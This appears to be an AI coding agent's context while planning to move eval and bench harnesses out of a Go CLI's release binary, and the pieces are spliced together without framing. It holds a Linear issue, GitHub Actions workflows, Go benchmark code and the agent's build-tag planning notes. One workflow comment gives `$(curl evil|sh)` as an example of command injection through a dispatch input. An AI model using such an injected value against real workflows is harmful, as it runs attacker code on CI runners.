Issue descriptions, comments, and documents often embed screenshots and other uploads as markdown images. Pass that markdown to extract_images to view them. Read issue attachments with get_attachment; files uploaded in comments are returned in the attachments field of list_comments. Linear upload URLs are signed and expire after a few minutes, so fetch them again instead of reusing old URLs.

Tools named save_* both create and update: omit id to create a new entity, or pass id to update an existing one. When updating, pass only the fields you want to change. To edit part of a long issue description or document, pass patch instead of resending the full content.

Before creating an issue, check with list_issues whether a matching issue already exists, to avoid duplicates. When creating, team is required.

The labels parameter of save_issue replaces the issue's full label set. To add or remove individual labels without dropping others, use addLabels and removeLabels instead.

Markdown content supports user mentions with @displayName (for example @johndoe). To embed an image or file, upload it with prepare_file_upload and insert the markdown it returns; do not inline base64 data.

Write issue descriptions for people to read. Keep sentences short, and use the same term for the same concept throughout.

Put extensive agent-specific detail, such as implementation plans, file lists, or reproduction logs, in a collapsible "Agent notes" section at the end of the description, so it does not crowd the human-readable part. A collapsible section opens with +++ followed by its title, and closes with +++ on its own line:

+++ Agent notes

Details for agents go here.

+++

{"id":"COR-2322","uuid":"8a0c96d3-548f-405a-a611-7c46675dfe84","title":"Brain: move eval and bench harnesses out of the shipped binary (~4k LOC)","description":"**Repo:** entireio/entire-brain · From the 2026-11-06 command-surface survey.

## Problem

Hidden developer harnesses compile into the released binary: `memories eval`/`eval-gen`/`eval-compare` (`facts_eval*.go`, \~2.5k LOC), `history-eval[-gen]` (\~0.4k), `bench {index,scale}` (\~1k). They are reachable only via hidden commands and serve development, not users.

## Change

Move them behind a build tag or into `tools/` so release binaries don't carry them. Constraint: `memories eval` is the acceptance gate for every ranking change (<issue id="3f94fa5e-4145-45b0-b9b8-c657a3b766b5" label="COR-2311" href="https://linear.app/entirehq/issue/COR-2311/brain-recall-ranking-quality-collapse-related-ids-pairs-recency-prior" /> and recorded precedent) — it must stay runnable from a dev checkout with one command, and CI lanes that use it must keep working. jobs:
  build:
    name: build
    runs-on: ubuntu-24.04
    outputs:
      bare: ${{ steps.v.outputs.bare }}
    steps:
      - uses: actions/checkout@v7
        with:
          persist-credentials: false

      - uses: actions/setup-go@90ad2b35f69faf97585ad74d28fa006d2739b7af # Official current-main v7.0.0 bundle with the repeated-DOCTYPE parser fix.
        with:
          go-version: "1.27.x"

      # Brain is pure Go: modernc sqlite is the only driver (the brain_cgo
      # variant was removed with semantic retrieval, trail #278). Every target
      # cross-compiles from one runner, and released binaries need no C
      # toolchain on the user's machine. This guard keeps it that way.
      - name: Verify the default build needs no cgo
        run: |
          set -euo pipefail
          CGO_ENABLED=0 go build -o /dev/null ./cmd/entire-brain
          echo "default build is pure Go"

      - name: Resolve version
        id: v
        env:
          # Never interpolate a workflow input straight into a run: block. The
          # expression is substituted as text before the shell parses it, so a
          # dispatch value like $(curl evil|sh) would execute on the runner.
          VERSION_INPUT: ${{ inputs.version }}
        run: |
          set -euo pipefail
          if [[ "${GITHUB_REF_TYPE}" == "tag" ]]; then
            version="${GITHUB_REF_NAME}"
          elif [[ -n "${VERSION_INPUT}" ]]; then
            version="${VERSION_INPUT}"
          else
            version="v0.0.0-dev.$(git rev-parse --short HEAD)"
          fi
          # A version reaches tag names, file names and release titles. Pin its
          # shape rather than trusting whatever was dispatched.
          if [[ ! "$version" =~ ^v[0-9]+\.[0-9]+\.[0-9]+([-+][0-9A-Za-z.-]+)?$ ]]; then
            echo "::error::refusing to build an unrecognised version: ${version}"
            exit 1
          fi
          echo "version=${version}" >> "$GITHUB_OUTPUT"
          echo "bare=${version#v}" >> "$GITHUB_OUTPUT"
          echo "building ${version}"

content.content:
One-shot blast radius for changing a symbol

Usage:
  entire graph impact --symbol NAME|<file>:<line> --repo . [--depth 1|2] [--limit 15] [--format text|json]

Everything the graph knows about changing one symbol in a single bounded explanation: direct + transitive callers (depth <=2), callees, type consumers (USES_TYPE/PARAM_TYPE/RETURNS_TYPE), data flows, files that historically co-change with the symbol's file, and same-container siblings. Run this before changing a function/type's behavior.

Ambiguous names return the definition list; rerun with --file/--line/--kind (or --symbol <file>:<line>) to pick one.

Flags:
  --symbol NAME|<file>:<line>
                            Symbol to analyze (required)
  --repo <path>             Repository (default: current repo)
  --file <path>             Disambiguate an ambiguous name by file
  --line <n>                Disambiguate by line
  --kind <kind>             Disambiguate by symbol kind
  --depth 1|2               Caller-traversal depth (default: 2)
  --limit <n>               Max entries per section (default: 15)
  --format text|json        Output format
  --max-context-bytes <n>   Total text budget (default: 4096)
  --exclude-tests           Drop test-only entries
  --head                    Query the committed tree (cached)
  --profile syntax-only|fast|full
                            Parsing depth (default: full)

Examples:
  entire graph impact --repo . --symbol WriteText

1	package bench
2	
3	import (
4		"context"
5		"encoding/json"
6		"fmt"
7		"io"
8		"os"
9		"path/filepath"
10		"runtime"
11		"time"
12	
13		"github.com/entireio/entire-brain/internal/cli/internal/base"
14		bmanifest "github.com/entireio/entire-brain/internal/cli/internal/manifest"
15		"github.com/entireio/entire-brain/internal/tui"
16		"github.com/spf13/cobra"
17	)
18	
19	// Config supplies the shared command options and the assembly package's
20	// storage and indexing operations. Dependencies are per invocation, never
21	// global hooks.
22	type Config struct {
23		base.Options
24		Deps Deps
25	}
26	
27	// Deps keeps the benchmark commands independent of command assembly, repo
28	// identity resolution, and the indexing engine.
29	type Deps struct {
30		RepoStoragePaths func(context.Context, base.CommandRunner, base.EntireEnv, string) (base.RepoStorage, error)
31		// RunSemanticIndex runs one full code-index build for the target
32		// repository under the supplied options' environment.
33		RunSemanticIndex func(ctx context.Context, cmd *cobra.Command, opts base.Options, req IndexRequest, target string) error
34		// ProcessMaxRSSBytes reports the process's peak resident set size, or 0
35		// where the platform cannot say.
36		ProcessMaxRSSBytes func() uint64
37		// ScaleCommand constructs the `bench scale` subcommand, which still lives
38		// with the retrieval engine it measures.
39		ScaleCommand func() *cobra.Command
40	}
41	
42	// IndexRequest is the slice of the index build's options the benchmark sets.
43	type IndexRequest struct {
44		Force             bool
45		GraphBinary       string
46		Profile           string
47		Timeout           time.Duration
48		InactivityTimeout time.Duration
49		Progress          func(phase string)
50	}
51	
52	type IndexBenchOptions struct {
53		JSON              bool
54		GraphBinary       string
55		Profile           string
56		Timeout           time.Duration
57		InactivityTimeout time.Duration
58		Keep              bool
59		Progress          bool
60	}
61	
62	type IndexBenchReport struct {
63		GeneratedAt     time.Time `json:"generated_at"`
64		RepoRoot        string    `json:"repo_root"`
65		BrainDir        string    `json:"brain_dir"`
66		Profile         string    `json:"profile,omitempty"`
67		Provider        string    `json:"provider,omitempty"`
68		ProviderVersion string    `json:"provider_version,omitempty"`
69		SchemaVersion   string    `json:"schema_version,omitempty"`
70		Files           int       `json:"files"`
71		Symbols         int       `json:"symbols"`
72		Relations       int       `json:"relations"`
73		Externals       int       `json:"externals"`
74		Warnings        int       `json:"warnings"`
75		PartialFailures int       `json:"partial_failures"`
76		WallMS          float64   `json:"wall_ms"`
77		MaxRSSBytes     uint64    `json:"max_rss_bytes"`
78		HeapAllocBytes  uint64    `json:"heap_alloc_bytes"`
79		TempRoot        string    `json:"temp_root"`
80		Kept            bool      `json:"kept"`
81	}
82	
83	func New(cfg Config) *cobra.Command {
84		cmd := &cobra.Command{
85			Hidden: true,
86			Use:    "bench",
87			Short:  "Benchmark code indexing performance",
88		}
89		cmd.AddCommand(newIndexCommand(cfg))
90		cmd.AddCommand(cfg.Deps.ScaleCommand())
91		return cmd
92	}
93	
94	func newIndexCommand(cfg Config) *cobra.Command {
95		benchOpts := IndexBenchOptions{GraphBinary: "entire"}
96		cmd := &cobra.Command{
97			Use:   "index [path]",
98			Short: "Benchmark end-to-end code indexing in an isolated store",
99			Args:  cobra.MaximumNArgs(1),
100			RunE: func(cmd *cobra.Command, args []string) error {
101				target := "."
102				if cfg.Env.RepoRoot != "" {
103					target = cfg.Env.RepoRoot
104				}
105				if len(args) == 1 {
106					target = args[0]
107				}
108				return RunIndexBench(cmd.Context(), cmd, cfg, benchOpts, target)
109			},
110		}
111		cmd.Flags().BoolVar(&benchOpts.JSON, "json", false, "Emit machine-readable JSON")
112		cmd.Flags().StringVar(&benchOpts.GraphBinary, "graph-binary", "entire", "Entire CLI binary that exposes `graph` provider commands")
113		cmd.Flags().StringVar(&benchOpts.Profile, "profile", "syntax-only", "Graph provider snapshot profile")
114		cmd.Flags().DurationVar(&benchOpts.Timeout, "graph-timeout", 0, "Overall deadline for the graph provider snapshot (0 uses the default)")
115		cmd.Flags().DurationVar(&benchOpts.InactivityTimeout, "graph-inactivity-timeout", 0, "Abort the snapshot if the provider emits no records for this long (0 uses the default)")
116		cmd.Flags().BoolVar(&benchOpts.Keep, "keep", false, "Keep the isolated benchmark store after the run")
117		cmd.Flags().BoolVar(&benchOpts.Progress, "progress", false, "Print Brain indexing phase progress to stderr")
118		return cmd
119	}
120	
121	func RunIndexBench(ctx context.Context, cmd *cobra.Command, cfg Config, benchOpts IndexBenchOptions, target string) error {
122		repoDir, local, err := base.ResolveLocalTargetRepoDir(ctx, cfg.Runner, target)
123		if err != nil {
124			return err
125		}
126		if !local {
127			return fmt.Errorf("index benchmark requires a local repository path: %s", target)
128		}
129		tempRoot, err := os.MkdirTemp("", "entire-brain-graph-bench-*")
130		if err != nil {
131			return err
132		}
133		if !benchOpts.Keep {
134			defer os.RemoveAll(tempRoot)
135		}
136		benchEnv := cfg.Env
137		benchEnv.PluginConfigDir = filepath.Join(tempRoot, "config")
138		benchEnv.PluginDataDir = filepath.Join(tempRoot, "data")
139		benchEnv.PluginStateDir = filepath.Join(tempRoot, "state")
140		benchEnv.PluginCacheDir = filepath.Join(tempRoot, "cache")
141		benchOpts.progressPhase("preparing isolated store")
142		benchRunOpts := cfg.Options
143		benchRunOpts.Env = benchEnv
144	
145		var after runtime.MemStats
146		runtime.GC()
147		start := time.Now()
148		indexOpts := IndexRequest{
149			Force:             true,
150			GraphBinary:       benchOpts.GraphBinary,
151			Profile:           benchOpts.Profile,
152			Timeout:           benchOpts.Timeout,
153			InactivityTimeout: benchOpts.InactivityTimeout,
154			Progress:          benchOpts.progressPhase,
155		}
156		indexCmd := &cobra.Command{Use: "bench index"}
157		indexCmd.SetOut(io.Discard)
158		indexCmd.SetErr(io.Discard)
159		if err := cfg.Deps.RunSemanticIndex(ctx, indexCmd, benchRunOpts, indexOpts, repoDir); err != nil {
160			return err
161		}
162		wall := time.Since(start)
163		runtime.ReadMemStats(&after)
164	
165		storage, err := cfg.Deps.RepoStoragePaths(ctx, cfg.Runner, benchEnv, repoDir)
166		if err != nil {
167			return err
168		}
169		manifest, err := bmanifest.Load(storage.BrainDir)
170		if err != nil {
171			return err
172		}
173		if manifest.Sources == nil || manifest.Sources.Semantic == nil {
174			return fmt.Errorf("index benchmark did not produce a code-index source")
175		}
176		src := manifest.Sources.Semantic
177		report := IndexBenchReport{
178			GeneratedAt:     cfg.Now().UTC(),
179			RepoRoot:        repoDir,
180			BrainDir:        storage.BrainDir,
181			Profile:         src.Profile,
182			Provider:        src.Provider,
183			ProviderVersion: src.ProviderVersion,
184			SchemaVersion:   src.SchemaVersion,
185			Files:           src.Files,
186			Symbols:         src.Symbols,
187			Relations:       src.Relations,
188			Externals:       src.Externals,
189			Warnings:        len(src.Warnings),
190			PartialFailures: len(src.PartialFailures),
191			WallMS:          RoundMillis(wall),
192			MaxRSSBytes:     cfg.Deps.ProcessMaxRSSBytes(),
193			HeapAllocBytes:  after.HeapAlloc,
194			TempRoot:        tempRoot,
195			Kept:            benchOpts.Keep,
196		}
197		if !benchOpts.JSON {
198			fmt.Fprintf(cmd.OutOrStdout(), "index bench for %s\n", report.RepoRoot)
199			fmt.Fprintf(cmd.OutOrStdout(), "profile: %s\n", report.Profile)
200			fmt.Fprintf(cmd.OutOrStdout(), "files: %d\nsymbols: %d\nrelations: %d\n", report.Files, report.Symbols, report.Relations)
201			fmt.Fprintf(cmd.OutOrStdout(), "wall_ms: %.2f\nmax_rss_bytes: %d\nheap_alloc_bytes: %d\n", report.WallMS, report.MaxRSSBytes, report.HeapAllocBytes)
202			if benchOpts.Keep {
203				fmt.Fprintf(cmd.OutOrStdout(), "brain_dir: %s\n", report.BrainDir)
204			}
205			return nil
206		}
207		enc := json.NewEncoder(cmd.OutOrStdout())
208		enc.SetIndent("", "  ")
209		return enc.Encode(report)
210	}
211	
212	func (o IndexBenchOptions) progressPhase(phase string) {
213		if o.Progress {
214			r := tui.NewRenderer(os.Stderr)
215			fmt.Fprintln(os.Stderr, r.Dim(fmt.Sprintf("index bench: %s", phase)))
216		}
217	}
218	
219	func RoundMillis(d time.Duration) float64 {
220		return float64(d.Microseconds()) / 1000
221	}

content.content:
name: test

on:
  push:
    branches: [main]
  pull_request:
  workflow_dispatch:

# A force-push or restack queues a new run without this; the superseded run
# kept waiting in the small depot-macos-26 pool and backed up every PR behind
# it. Non-PR runs get a per-run group: a shared group would let GitHub replace
# a *pending* run even with cancel-in-progress false, skipping tests for
# intermediate commits on rapid pushes to main.
concurrency:
  group: test-${{ github.event.pull_request.number || github.run_id }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}

permissions:
  contents: read

jobs:
  memory-storage-compatibility:
    strategy:
      matrix:
        runner: [depot-ubuntu-24.04-4, depot-macos-26]
    runs-on: ${{ matrix.runner }}
    timeout-minutes: 20
    steps:
      - uses: actions/checkout@v7
        with: { fetch-depth: 0 }
      - uses: actions/setup-go@90ad2b35f69faf97585ad74d28fa006d2739b7af
        with: { go-version: "1.27.3" }
      - name: Storage, privacy, memory commands, and sync against stable CLIs
        run: bash scripts/test-memory-storage-compat.sh

  lint:
    runs-on: depot-ubuntu-24.04-4
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-go@90ad2b35f69faf97585ad74d28fa006d2739b7af # Official current-main v7.0.0 bundle with the repeated-DOCTYPE parser fix.
        with: { go-version: "1.27.3" }
      - run: go vet ./...
      - name: Test browser controller request lifetimes
        run: node --test webui/tests/*.test.cjs
      - run: |
          unformatted=$(gofmt -l -s .)
          if [ -n "$unformatted" ]; then
            echo "::error::unformatted files:"
            echo "$unformatted"
            exit 1
          fi

  browser-smoke:
    runs-on: depot-ubuntu-24.04-4
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-go@90ad2b35f69faf97585ad74d28fa006d2739b7af
        with: { go-version: "1.27.3" }
      - uses: actions/setup-node@v7
        with: { node-version: "22" }
      - run: npm ci --prefix webui --ignore-scripts
      - run: npm exec --prefix webui -- playwright install --with-deps chromium

121	func RunIndexBench(ctx context.Context, cmd *cobra.Command, cfg Config, benchOpts IndexBenchOptions, target string) error {
122		repoDir, local, err := base.ResolveLocalTargetRepoDir(ctx, cfg.Runner, target)
123		if err != nil {
124			return err
125		}
126		if !local {
127			return fmt.Errorf("index benchmark requires a local repository path: %s", target)
128		}
129		tempRoot, err := os.MkdirTemp("", "entire-brain-graph-bench-*")
130		if err != nil {
131			return err
132		}
133		if !benchOpts.Keep {
134			defer os.RemoveAll(tempRoot)
135		}
136		benchEnv := cfg.Env
137		benchEnv.PluginConfigDir = filepath.Join(tempRoot, "config")
138		benchEnv.PluginDataDir = filepath.Join(tempRoot, "data")
139		benchEnv.PluginStateDir = filepath.Join(tempRoot, "state")
140		benchEnv.PluginCacheDir = filepath.Join(tempRoot, "cache")
141		benchOpts.progressPhase("preparing isolated store")
142		benchRunOpts := cfg.Options
143		benchRunOpts.Env = benchEnv
144	
145		var after runtime.MemStats
146		runtime.GC()
147		start := time.Now()
148		indexOpts := IndexRequest{
149			Force:             true,
150			GraphBinary:       benchOpts.GraphBinary,
151			Profile:           benchOpts.Profile,
152			Timeout:           benchOpts.Timeout,
153			InactivityTimeout: benchOpts.InactivityTimeout,
154			Progress:          benchOpts.progressPhase,
155		}
156		indexCmd := &cobra.Command{Use: "bench index"}
157		indexCmd.SetOut(io.Discard)
158		indexCmd.SetErr(io.Discard)
159		if err := cfg.Deps.RunSemanticIndex(ctx, indexCmd, benchRunOpts, indexOpts, repoDir); err != nil {
160			return err
161		}
162		wall := time.Since(start)
163		runtime.ReadMemStats(&after)
164	
165		storage, err := cfg.Deps.RepoStoragePaths(ctx, cfg.Runner, benchEnv, repoDir)
166		if err != nil {
167			return err
168		}
169		manifest, err := bmanifest.Load(storage.BrainDir)
170		if err != nil {
171			return err
172		}
173		if manifest.Sources == nil || manifest.Sources.Semantic == nil {
174			return fmt.Errorf("index benchmark did not produce a code-index source")
175		}
176		src := manifest.Sources.Semantic
177		report := IndexBenchReport{
178			GeneratedAt:     cfg.Now().UTC(),
179			RepoRoot:        repoDir,
180			BrainDir:        storage.BrainDir,
181			Profile:         src.Profile,
182			Provider:        src.Provider,
183			ProviderVersion: src.ProviderVersion,
184			SchemaVersion:   src.SchemaVersion,
185			Files:           src.Files,
186			Symbols:         src.Symbols,
187			Relations:       src.Relations,
188			Externals:       src.Externals,
189			Warnings:        len(src.Warnings),
190			PartialFailures: len(src.PartialFailures),
191			WallMS:          RoundMillis(wall),
192			MaxRSSBytes:     cfg.Deps.ProcessMaxRSSBytes(),
193			HeapAllocBytes:  after.HeapAlloc,
194			TempRoot:        tempRoot,
195			Kept:            benchOpts.Keep,
196		}
197		if !benchOpts.JSON {
198			fmt.Fprintf(cmd.OutOrStdout(), "index bench for %s\n", report.RepoRoot)
199			fmt.Fprintf(cmd.OutOrStdout(), "profile: %s\n", report.Profile)
200			fmt.Fprintf(cmd.OutOrStdout(), "files: %d\nsymbols: %d\nrelations: %d\n", report.Files, report.Symbols, report.Relations)
201			fmt.Fprintf(cmd.OutOrStdout(), "wall_ms: %.2f\nmax_rss_bytes: %d\nheap_alloc_bytes: %d\n", report.WallMS, report.MaxRSSBytes, report.HeapAllocBytes)
202			if benchOpts.Keep {
203				fmt.Fprintf(cmd.OutOrStdout(), "brain_dir: %s\n", report.BrainDir)
204			}
205			return nil
206		}
207		enc := json.NewEncoder(cmd.OutOrStdout())
208		enc.SetIndent("", "  ")
209		return enc.Encode(report)
210	}

213		if o.Progress {
214			r := tui.NewRenderer(os.Stderr)
215			fmt.Fprintln(os.Stderr, r.Dim(fmt.Sprintf("index bench: %s", phase)))
216		}
217	}

219	func RoundMillis(d time.Duration) float64 {
220		return float64(d.Microseconds()) / 1000

name: test

on:
  push:
    branches: [main]
  pull_request:
  workflow_dispatch:

# A force-push or restack queues a new run without this; the superseded run
# kept waiting in the small depot-macos-26 pool and backed up every PR behind
# it. Non-PR runs get a per-run group: a shared group would let GitHub replace
# a *pending* run even with cancel-in-progress false, skipping tests for
# intermediate commits on rapid pushes to main.
concurrency:
  group: test-${{ github.event.pull_request.number || github.run_id }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}

permissions:
  contents: read

jobs:
  memory-storage-compatibility:
    strategy:
      matrix:
        runner: [depot-ubuntu-24.04-4, depot-macos-26]
    runs-on: ${{ matrix.runner }}
    timeout-minutes: 20
    steps:
      - uses: actions/checkout@v7
        with: { fetch-depth: 0 }
      - uses: actions/setup-go@90ad2b35f69faf97585ad74d28fa006d2739b7af
        with: { go-version: "1.27.3" }
      - name: Storage, privacy, memory commands, and sync against stable CLIs
        run: bash scripts/test-memory-storage-compat.sh

  lint:
    runs-on: depot-ubuntu-24.04-4
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-go@90ad2b35f69faf97585ad74d28fa006d2739b7af # Official current-main v7.0.0 bundle with the repeated-DOCTYPE parser fix.
        with: { go-version: "1.27.3" }
      - run: go vet ./...
      - name: Test browser controller request lifetimes
        run: node --test webui/tests/*.test.cjs
      - run: |
          unformatted=$(gofmt -l -s .)
          if [ -n "$unformatted" ]; then
            echo "::error::unformatted files:"
            echo "$unformatted"
            exit 1
          fi

  browser-smoke:
    runs-on: depot-ubuntu-24.04-4
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-go@90ad2b35f69faf97585ad74d28fa006d2739b7af
        with: { go-version: "1.27.3" }
      - uses: actions/setup-node@v7
        with: { node-version: "22" }
      - run: npm ci --prefix webui --ignore-scripts
      - run: npm exec --prefix webui -- playwright install --with-deps chromium
      - run: go build -o "$RUNNER_TEMP/entire-brain" ./cmd/entire-brain
      - name: Exercise the embedded UI in Chromium
        run: BRAIN_VIZ_BINARY="$RUNNER_TEMP/entire-brain" npm --prefix webui run test:browser
      - uses: actions/upload-artifact@v7
        if: failure()
        with:
          name: browser-smoke-traces
          path: webui/test-results/

  build:
    runs-on: depot-ubuntu-24.04-4
    strategy:
      matrix:
        goos: [darwin, linux, windows]
        goarch: [amd64, arm64]
        exclude:
          - { goos: windows, goarch: arm64 }
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-go@90ad2b35f69faf97585ad74d28fa006d2739b7af
        with: { go-version: "1.27.3" }
      - env:
          GOOS: ${{ matrix.goos }}
          GOARCH: ${{ matrix.goarch }}
        run: go build ./...

  test:
    needs: [real-product-integration, regression-mutations]
    if: always()
    strategy:
      fail-fast: false
      matrix:
        os: [ubuntu-latest, macos-latest]
        include:
          - os: ubuntu-latest
            runner: depot-ubuntu-24.04-8
          - os: macos-latest
            runner: depot-macos-26
    # Preserve the required check names on main.
    name: test (${{ matrix.os }})
    runs-on: ${{ matrix.runner }}
    # Full coverage runs use native Go tooling.
    timeout-minutes: 60
    steps:
      - name: Require integration and mutation checks
        env:
          INTEGRATION_RESULT: ${{ needs.real-product-integration.result }}
          MUTATION_RESULT: ${{ needs.regression-mutations.result }}
        run: |
          test "$INTEGRATION_RESULT" = success
          test "$MUTATION_RESULT" = success
      - uses: actions/checkout@v7
      - uses: actions/setup-go@90ad2b35f69faf97585ad74d28fa006d2739b7af
        with: { go-version: "1.27.3" }
      - name: Test with race detection, coverage, and CLI contracts
        run: go run ./tools/coverage -race -output "${{ runner.temp }}/brain-coverage"
      - name: Retain coverage and test results
        if: always()
        uses: actions/upload-artifact@v7
        with:
          name: coverage-default-${{ matrix.os }}
          path: |
            ${{ runner.temp }}/brain-coverage/*.json
            ${{ runner.temp }}/brain-coverage/*.jsonl
            ${{ runner.temp }}/brain-coverage/*.out
            ${{ runner.temp }}/brain-coverage/*.html

  real-product-integration:
    runs-on: depot-ubuntu-24.04-8
    timeout-minutes: 20
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-go@90ad2b35f69faf97585ad74d28fa006d2739b7af
        with: { go-version: "1.27.3" }
      - name: Check out the fixed Graph integration dependency
        uses: actions/checkout@v7
        with:
          repository: entireio/entire-graph
          ref: 28382d8ee2f0cb4ebc962255a3d8cbd364d2f258
          path: .context/integration-graph
          persist-credentials: false
      - name: Build both real products
        run: |
          go build -o "$RUNNER_TEMP/entire-brain" ./cmd/entire-brain
          cd .context/integration-graph
          go build -o "$RUNNER_TEMP/entire-graph" ./cmd/entire-graph
      - name: Require real product integration
        env:
          BRAIN_INTEGRATION_REQUIRED: "1"
          BRAIN_INTEGRATION_BRAIN_BINARY: ${{ runner.temp }}/entire-brain
          BRAIN_INTEGRATION_GRAPH_BINARY: ${{ runner.temp }}/entire-graph
        run: go test ./tools/integration -count=1 -timeout 10m -v

  windows-test-shards:
    name: Windows test group ${{ matrix.shard }}
    runs-on: depot-windows-2025-8
    timeout-minutes: 45
    strategy:
      fail-fast: false
      matrix:
        shard: [0, 1, 2, 3, 4, 5]
    steps:
      - uses: actions/checkout@v7
        with: { persist-credentials: false }
      - uses: actions/setup-go@90ad2b35f69faf97585ad74d28fa006d2739b7af
        with: { go-version: "1.27.3" }
      - name: Vet every Windows package with race settings
        if: matrix.shard == 0
        run: go vet -race ./...
      - name: Run assigned tests with race detection and coverage
        run: go run ./tools/coverage -race -cli-shards 6 -cli-shard ${{ matrix.shard }} -test-timeout 20m -output "${{ runner.temp }}/brain-coverage"
      - name: Retain test evidence
        if: always()
        uses: actions/upload-artifact@v7
        with:
          name: coverage-windows-shard-${{ matrix.shard }}
          if-no-files-found: error
          path: |
            ${{ runner.temp }}/brain-coverage/*.json
            ${{ runner.temp }}/brain-coverage/*.jsonl
            ${{ runner.temp }}/brain-coverage/*.out
            ${{ runner.temp }}/brain-coverage/*.html

  windows-test:
    name: test (windows-latest)
    needs: windows-test-shards
    if: always()
    runs-on: depot-ubuntu-24.04-4
    timeout-minutes: 10
    steps:
      - name: Require every Windows group and static check
        env:
          TEST_RESULT: ${{ needs.windows-test-shards.result }}
        run: test "$TEST_RESULT" = success
      - uses: actions/checkout@v7
      - uses: actions/setup-go@90ad2b35f69faf97585ad74d28fa006d2739b7af
        with: { go-version: "1.27.3" }
      - uses: actions/download-artifact@v8
        with:
          pattern: coverage-windows-shard-*
          path: ${{ runner.temp }}/windows-test-groups
      - name: Verify complete test outcomes and combine coverage
        run: go run ./tools/coverage -merge-input "${{ runner.temp }}/windows-test-groups" -output "${{ runner.temp }}/windows-coverage"
      - uses: actions/upload-artifact@v7
        with:
          name: coverage-windows-combined
          if-no-files-found: error
          path: ${{ runner.temp }}/windows-coverage/

  regression-mutations:
    runs-on: depot-ubuntu-24.04-8
    timeout-minutes: 20
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-go@90ad2b35f69faf97585ad74d28fa006d2739b7af
        with: { go-version: "1.27.3" }
      - name: Prove the selected tests detect their intended regressions
        run: go run ./tools/mutationcheck -output "${{ runner.temp }}/brain-mutations"
      - name: Retain baseline and mutant test evidence
        if: always()
        uses: actions/upload-artifact@v7
        with:
          name: regression-mutation-results
          if-no-files-found: error
          path: ${{ runner.temp }}/brain-mutations/

I'm checking how the CI test lanes invoke `go test`, since the coverage and mutation tools may run it underneath. The open question is whether the dev lanes should carry the harness build tag so those tests keep running, and making the coverage tool pass it looks like the simplest route.

I'm weighing whether moving the eval code into a separate tools/ package would work, but it can't reach the unexported internal/cli symbols, so the build tag stays the viable route. I'm also considering keeping the tagged files in package cli and having the coverage tool pass the tag, so release builds drop the harness code while the untagged compile still needs checking.

I'm working out which other files reference the harness symbols, since any that do will also need the build tag. Next I'll check whether the mutation tool and the memory compat script invoke `go test` or touch eval code, and look at the hidden-path assertions in root_test.go.

I'm planning to move the harness command registration into a tagged hook file: the facts admin commands get a `addFactsHarnessCommands` call in place of their three AddCommand lines, and root.go drops the bench import and its hidden registrations in favor of a single `addHarnessCommands` hook. The bench package can stay untagged since nothing links it unless it's imported, so only bench_config.go really needs the tag.

I'm listing the remaining test files that reference the harness symbols, such as the bench scale and history eval tests, so each one gets the build tag too.

I'm checking whether the semantic bench, benchmarks doc, and history FTS benchmark tests use any of the harness symbols, or whether they stand alone as plain Go benchmarks. The compiler will settle the question, but a quick grep for the harness prefixes across internal/cli, skipping the harness files, should show the actual cross-references first. I also still need to see how tools/mutationcheck and tools/coverage invoke `go test`, and whether either one touches eval code.

--- mise:
mise.toml
--- docs page:
docs/reference.md
docs/benchmarks.md
docs/getting-started.md
--- release build:

      - name: Build every target
        env:
          VERSION: ${{ steps.v.outputs.version }}
          BARE: ${{ steps.v.outputs.bare }}
        run: |
          set -euo pipefail
          mkdir -p dist
          targets="linux/amd64 linux/arm64 darwin/amd64 darwin/arm64 windows/amd64 windows/arm64"
          for t in $targets; do
            goos="${t%/*}"; goarch="${t#*/}"
            out="entire-brain"
            [[ "$goos" == windows ]] && out="entire-brain.exe"
            echo "==> $goos/$goarch"
            CGO_ENABLED=0 GOOS="$goos" GOARCH="$goarch" \
              go build -trimpath -ldflags "-s -w -X main.version=${BARE}" \
              -o "dist/$out" ./cmd/entire-brain
            asset="entire-brain_${BARE}_${goos}_${goarch}"
            if [[ "$goos" == windows ]]; then
              (cd dist && zip -q "${asset}.zip" "$out" && rm "$out")
            else
              (cd dist && tar -czf "${asset}.tar.gz" "$out" && rm "$out")
            fi
          done
          (cd dist && sha256sum * > checksums.txt)
          ls -la dist

      - uses: actions/upload-artifact@v7
        with:
          name: release-dist
          path: dist/
          retention-days: 7

  # Cross-compiling from one runner means nothing on the release path ever
  # executes a Windows binary, and test.yml's Windows suite runs CGO_ENABLED=1
  # for the race detector — not the pure-Go configuration that ships. This job
  # tests that shipped configuration and smoke-runs the exact windows/amd64
  # artifact the release will carry. publish requires it, so a release cannot
  # ship untested Windows binaries. windows/arm64 is still only cross-compiled:
  # no amd64 runner can execute it.
  windows-verify:
